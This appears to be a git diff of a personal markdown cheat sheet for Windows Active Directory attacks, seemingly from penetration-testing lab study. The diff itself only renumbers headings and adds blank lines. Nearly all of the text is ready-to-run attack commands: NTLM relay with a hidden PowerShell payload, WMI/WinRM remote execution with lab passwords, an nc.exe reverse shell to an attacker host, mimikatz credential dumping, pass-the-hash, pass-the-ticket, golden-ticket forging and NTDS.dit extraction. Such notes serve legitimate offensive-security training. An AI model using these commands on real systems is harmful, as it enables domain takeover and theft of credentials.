@@ -30,6 +30,7 @@ vnc
 # 1 Setup in Kali
 impacket-ntlmrelayx --no-http-server -smb2support -t RELAY_TO_IP -c "powershell.exe -nop -w hidden -enc encoded_payload..."
 
+
 # 2 Force auth
 dir \\KALI_IP\path\to\test
 ```
@@ -56,14 +57,15 @@ evil-winrm -i `tip` -u USER -H HASH
 ## WMI (rpc)
 ***runs as session 0***
 ```shell
-# 1. Print payload
+# 1 Print payload
 python3 ./encode.py
 
-# 2
-# cmd
+
+# 2 Run
+# A cmd
 wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e ..."
 
-# PS CimSession
+# B PS CimSession
 $username = 'jen';
 $password = 'Nexus123!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -76,15 +78,15 @@ Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Creat
 ```
 ## WinRm (RMU)
 ```shell
-# 1. Print payload
+# 1 Print payload
 python3 ./encode.py
 
 
-# 2
-# winrs
+# 2 Run
+# A winrs
 winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop ..."
 
-# PS PsSession
+# B PS PsSession
 $username = 'jen'; # known user
 $password = 'Nexus123!'; # known password
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -103,11 +105,11 @@ Enter-PSSession 1
 ```
 ## runas / start-process (GUI)
 ```shell
-# cmd
+# A cmd
 runas /user:[DOMAIN\]Administrator "cmd.exe /c powershell"
 # /c (non-interactive) /k (interactive)
 
-# PS
+# B PS
 Start-Process PowerShell -Verb RunAs
 ```
 ## start-process (Non GUI)
@@ -122,14 +124,15 @@ Start-Process -FilePath C:\path\to\program.exe -Credential $Credential
 ```
 ## RunasCs (Non Gui)
 ```shell
-# Invode-RunasCs.ps1 #
+# A Invode-RunasCs.ps1
 powershell -ep bypass
 . .\Invoke-RunasCs.ps1
 
 # nc.exe reverse payload (try others if it doesnt work)
 Invoke-RunasCs DOMAIN\user pass "C:\Users\Public\nc.exe KALI_IP LPORT -e powershell" --force-profile --logon-type 2
 
-# RunasCs.exe #
+
+# B RunasCs.exe
 RunasCs.exe user pass cmd ...
 -d [domain]
 -r [host]:[port] (reverse shell)
@@ -142,6 +145,7 @@ RunasCs.exe user pass cmd ...
 # 1 In ADMIN powershell, add target to trustedhosts
 Enable-PSRemoting
 Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80
+
 
 # 2 Run
 # A Single command
@@ -177,6 +181,7 @@ sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NT hash] /run:"[command]"
 impacket-getTGT.py -dc-ip `dc` jurassic.park/velociraptorr -hashes :HASH
 export KRB5CCNAME=./velociraptor.ccache
 
+
 # 2 
 impacket-psexec jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
@@ -187,21 +192,26 @@ privilege::debug
 token::elevate
 sekurlsa::logonpasswords
 
+
 # 2 USE pth to spawn PS in context of jen
 sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+
 
 # 3 FROM SPAWNED PS, obtain the TGT using a program that will use authentication
 net user /domain
 ls \\<DC>\sysvol
 
+
 # 4 View the ticket (krbtgt server one is the TGT)
 klist
 
+
+#
 # 5 Check success using a program such as PsExec
 .\PsExece.exe \\files04 cmd
-
-
-# b) Rubeus
+```
+## rubeus
+```shell
 .\Rubeus.exe asktgt /domain:[domain] /user:[user] /rc4:[hash] /ptt
 ```
 # ***Pass-The-Ticket***
@@ -212,10 +222,8 @@ klist
 export KRB5CCNAME=ticket.ccache
 impacket-psexec jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-## mimikatz / rubeus
+## mimikatz
 ```shell
-# a) mimikatz
-#
 # NO ACCESS as some Domain User initially (jen in this example)
 ls \\web04\backup
 
@@ -230,16 +238,16 @@ dir *.kirbi
 # 3 INJECT the above TGS
 kerberos::ptt ...-dave@cifs-web04.kirbi
 
-# 4. CHECK we have TGS
+# 4 CHECK we have TGS
 klist
 
+
+#
 # TO ACCESS!
 ls \\web04\backup
-
-
-##########
-# RUBEUS #
-##########
+```
+## rubeus
+```shell
 .\Rubeus.exe ptt /ticket:[ticket]
 ```
 
@@ -250,14 +258,18 @@ ls \\web04\backup
 # 1 OBTAIN krbtgt SID and NTLM hash
 lsadump::lsa /patch
 
+
 # 2 Clear existing tickets
 kerberos::purge
+
 
 # 3 Obtain TGT 
 kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 
+
 # 4 Open cmd
 misc::cmd
+
 
 #
 # PsExec
@@ -270,15 +282,19 @@ PsExec.exe \\dc1 cmd.exe
 vshadow.exe -nw -p  C:
 #powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 
+
 # 2 Copy to C:\ 
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
 
 # 3 Backup the SYSTEM hive
 reg.exe save hklm\system c:\system.bak
 
+
 # 4 Upload to KALI
 
-# 5. KALI
+
+# 5 KALI
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
